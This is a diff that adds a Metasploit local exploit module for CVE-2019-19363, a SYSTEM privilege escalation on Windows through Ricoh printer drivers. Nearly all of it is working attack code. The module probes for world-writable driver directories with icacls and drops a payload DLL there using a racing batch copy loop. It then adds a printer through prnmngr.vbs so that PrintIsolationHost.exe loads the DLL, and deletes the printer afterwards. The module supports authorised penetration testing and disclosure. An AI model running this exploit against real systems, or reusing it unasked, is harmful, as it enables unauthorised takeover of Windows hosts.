@@ -1,0 +1,164 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/exploit/exe'
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = NormalRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Post::Windows::Priv
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Ricoh Driver Privilege Escalation',
+      'Description'    => %q(
+        Various Ricoh printer drivers allow escalation of
+        privileges on Windows systems.
+
+        For vulnerable drivers, a low-privileged user can
+        read/write files within the `RICOH_DRV` directory
+        and its subdirectories.
+
+        `PrintIsolationHost.exe`, a Windows process running
+        as NT AUTHORITY\SYSTEM, loads driver-specific DLLs
+        during the installation of a printer. A user can
+        elevate to SYSTEM by writing a malicious DLL to
+        the vulnerable driver directory and adding a new
+        printer with a vulnerable driver.
+
+        This module leverages the `prnmngr.vbs` script
+        to add and delete printers. Multiple runs of this
+        module may be required given successful exploitation
+        is time-sensitive.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+                            'Alexander Pudwill',  # discovery & PoC
+                            'Pentagrid AG',       # PoC
+                            'Shelby Pace'         # msf module
+                          ],
+      'References'     =>
+        [
+          [ 'CVE', '2019-19363'],
+          [ 'URL', 'https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/']
+        ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'Platform'       => 'win',
+      'Payload'        =>
+      {
+      },
+      'SessionTypes'   => [ 'meterpreter' ],
+      'Targets'        =>
+        [[
+            'Windows', { 'Arch'  => [ ARCH_X86, ARCH_X64 ] }
+        ]],
+      'Notes'          =>
+      {
+        'SideEffects' =>  [ ARTIFACTS_ON_DISK ],
+        'Reliability' =>  [ UNRELIABLE_SESSION ],
+        'Stability'   =>  [ SERVICE_RESOURCE_LOSS ]
+      },
+      'DisclosureDate' => "Jan 22 2020",
+      'DefaultTarget'  => 0
+    ))
+
+    self.needs_cleanup = true
+
+    register_advanced_options([
+      OptBool.new('ForceExploit', [ false, 'Override check result', false ])
+    ])
+  end
+
+  def check
+    dir_name = "C:\\ProgramData\\RICOH_DRV"
+
+    return CheckCode::Safe('No Ricoh driver directory found') unless directory?(dir_name)
+    driver_names = dir(dir_name)
+
+    return CheckCode::Detected("Detected Ricoh driver directory, but no installed drivers") unless driver_names.length
+
+    vulnerable = false
+    driver_names.each do |driver_name|
+      full_path = "#{dir_name}\\#{driver_name}\\_common\\dlz"
+      next unless directory?(full_path)
+      @driver_path = full_path
+
+      res = cmd_exec("icacls \"#{@driver_path}\"")
+      next unless res.include?('Everyone:')
+      next unless res.match(/\(F\)/)
+
+      vulnerable = true
+      break
+    end
+
+    return CheckCode::Detected('Ricoh driver directory does not have full permissions') unless vulnerable
+
+    vprint_status("Vulnerable driver directory: #{@driver_path}")
+    CheckCode::Appears('Ricoh driver directory has full permissions')
+  end
+
+  def add_printer(driver_name)
+    fail_with(Failure::NotFound, 'Printer driver script not found') unless file?(@script_path)
+
+    dll_data = generate_payload_dll
+    dll_path = "#{@driver_path}\\headerfooter.dll"
+
+    temp_path = expand_path('%TEMP%\\headerfooter.dll')
+    vprint_status("Writing dll to #{temp_path}")
+
+    bat_file_path = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(5..9)}.bat")
+    cp_cmd = "copy /y \"#{temp_path}\" \"#{dll_path}\""
+    bat_file = <<~HEREDOC
+      :repeat
+      #{cp_cmd} && goto :repeat
+    HEREDOC
+
+    write_file(bat_file_path, bat_file)
+    write_file(temp_path, dll_data)
+    register_files_for_cleanup(bat_file_path, temp_path)
+
+    script_cmd = "cscript \"#{@script_path}\" -a -p \"#{@printer_name}\" -m \"#{driver_name}\" -r \"lpt1:\""
+    bat_cmd = "cmd.exe /c \"#{bat_file_path}\""
+    print_status("Adding printer #{@printer_name}...")
+    client.sys.process.execute(script_cmd, nil, { 'Hidden' => true })
+    vprint_status("Executing script...")
+    cmd_exec(bat_cmd)
+  rescue Rex::Post::Meterpreter::RequestError => e
+    e_log("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+  end
+
+  def exploit
+    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?
+
+    fail_with(Failure::None, 'Must have a Meterpreter session to run this module') unless session.type == 'meterpreter'
+
+    if sysinfo['Architecture'] != payload.arch.first
+      fail_with(Failure::BadConfig, 'The payload should use the same architecture as the target driver')
+    end
+
+    @driver_path = ''
+    unless check == CheckCode::Appears || datastore['ForceExploit']
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override')
+    end
+
+    @printer_name = Rex::Text.rand_text_alpha(5..9)
+    @script_path = "C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs"
+    drvr_name = @driver_path.split('\\')
+    drvr_name_idx = drvr_name.index('RICOH_DRV') + 1
+    drvr_name = drvr_name[drvr_name_idx]
+
+    add_printer(drvr_name)
+  end
+
+  def cleanup
+    print_status("Deleting printer #{@printer_name}")
+    Rex.sleep(3)
+    delete_cmd = "cscript \"#{@script_path}\" -d -p \"#{@printer_name}\""
+    client.sys.process.execute(delete_cmd, nil, { 'Hidden' => true })
+  end
+end
